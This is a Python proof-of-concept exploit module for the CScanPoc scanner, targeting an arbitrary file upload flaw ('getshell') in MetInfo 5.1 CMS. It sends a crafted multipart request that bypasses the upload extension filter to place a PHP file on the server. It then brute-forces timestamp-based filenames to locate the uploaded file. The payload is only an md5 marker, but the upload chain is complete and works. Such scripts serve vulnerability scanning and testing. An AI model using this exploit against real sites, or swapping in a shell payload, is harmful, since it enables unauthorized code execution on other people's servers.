# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import time


class Vuln(ABVuln):
    vuln_id = 'MetInfo_0014'  # 平台漏洞编号，留空
    name = 'MetInfo5.1 任意文件上传getshell'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.FILE_UPLOAD  # 漏洞类型
    disclosure_date = '2015-07-09'  # 漏洞公布时间
    desc = '''
        MetInfo V5.1 任意文件上传，可getshell.
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'MetInfo'  # 漏洞应用名称
    product_version = 'V5.1'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'a005fb4d-1bfe-4e2c-b758-ec1f9d2d51d5'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-16'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            hh = hackhttp.hackhttp()
            url = self.target + \
                "/feedback/uploadfile_save.php?met_file_format=pphphp&met_file_maxsize=9999&lang=metinfo"

            raw = '''
POST /feedback/uploadfile_save.php?met_file_format=pphphp&met_file_maxsize=9999&lang=metinfo HTTP/1.1
Host: localhost
Content-Length: 423
Cache-Control: max-age=0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Origin: null
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.73 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryE1toBNeESf6p0uXQ
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.8
Cookie: PHPSESSID=hfqa37uap92gdaoc2nsco6g0n1

------WebKitFormBoundaryE1toBNeESf6p0uXQ
Content-Disposition: form-data; name="fd_para[1][para]"

filea
------WebKitFormBoundaryE1toBNeESf6p0uXQ
Content-Disposition: form-data; name="fd_para[1][type]"

5
------WebKitFormBoundaryE1toBNeESf6p0uXQ
Content-Disposition: form-data; name="filea"; filename="test.php"
Content-Type: application/x-php

<?php echo md5(1); ?>
------WebKitFormBoundaryE1toBNeESf6p0uXQ--
    '''
            # proxy=('127.0.0.1',8080)
            code, head, res, errcode, finalurl = hh.http(url, raw=raw)
            # upload  file

            # get upload file name
            name = int(time.time())
            for i in range(100, 10000):
                filename = name + i
                url = self.target + '/upload/file/%s.php' % (str(filename))
                # print url
                code, head, res, errcode, finalurl = hh.http(url)

                if code == 200 and "c4ca4238a0b923820dcc509a6f75849b" in res:
                    #security_hole('file upload Vulnerable:'+arg+"feedback/uploadfile_save.php?met_file_format=pphphp&met_file_maxsize=9999&lang=metinfo")
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))
                    break

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
